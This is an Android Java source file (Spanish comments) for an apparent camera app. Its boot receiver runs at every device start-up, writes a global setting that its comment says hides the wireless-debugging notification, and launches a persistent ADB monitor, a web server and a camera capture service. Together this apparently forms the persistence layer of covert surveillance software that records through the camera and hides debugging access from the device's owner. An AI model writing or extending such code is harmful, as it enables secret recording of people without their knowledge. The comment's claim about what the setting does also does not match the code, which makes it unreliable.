package com.example.detectcamera;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;

import androidx.core.content.ContextCompat;

/**
 * Arranque automático de Android después del boot.
 */
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "DetectCameraBoot";

    @Override
    public void onReceive(
            Context context,
            Intent intent
    ) {

        if (intent == null) {
            return;
        }

        String action = intent.getAction();

        if (
                Intent.ACTION_BOOT_COMPLETED.equals(action)
                        ||
                Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action)
                        ||
                "android.intent.action.QUICKBOOT_POWERON".equals(action)
        ) {

            Log.i(
                    TAG,
                    "Reinicio detectado. Restaurando Android..."
            );

            try {

                /*
                 * =====================================================
                 * 1. OCULTAR LA NOTIFICACIÓN DE WIRELESS DEBUGGING
                 * =====================================================
                 *
                 * Se hace DIRECTAMENTE mediante Settings.Global.
                 *
                 * No usamos executeShell() aquí porque ADB todavía
                 * podría no estar conectado en este momento.
                 */
                try {

                    Settings.Global.putInt(
                            context.getContentResolver(),
                            "hidden_api_policy",
                            1
                    );

                    Log.i(
                            TAG,
                            "hidden_api_policy establecido en 1."
                    );

                } catch (Throwable t) {

                    Log.e(
                            TAG,
                            "No se pudo establecer hidden_api_policy.",
                            t
                    );
                }


                /*
                 * =====================================================
                 * 2. ARRANCAR MONITOR ADB
                 * =====================================================
                 */
                PruxAdbEngine
                        .get(context)
                        .startPersistentMonitoring();


                /*
                 * =====================================================
                 * 3. SERVIDOR WEB
                 * =====================================================
                 */
                Intent serverIntent =
                        new Intent(
                                context,
                                ServerService.class
                        );

                ContextCompat
                        .startForegroundService(
                                context,
                                serverIntent
                        );


                /*
                 * =====================================================
                 * 4. CÁMARA Y CAPTURA
                 * =====================================================
                 */
                Intent cameraIntent =
                        new Intent(
                                context,
                                CameraService.class
                        );

                ContextCompat
                        .startForegroundService(
                                context,
                                cameraIntent
                        );


                Log.i(
                        TAG,
                        "Servicios Android iniciados después del boot."
                );

            } catch (Throwable t) {

                Log.e(
                        TAG,
                        "Error al iniciar servicios después del boot",
                        t
                );
            }
        }
    }
}
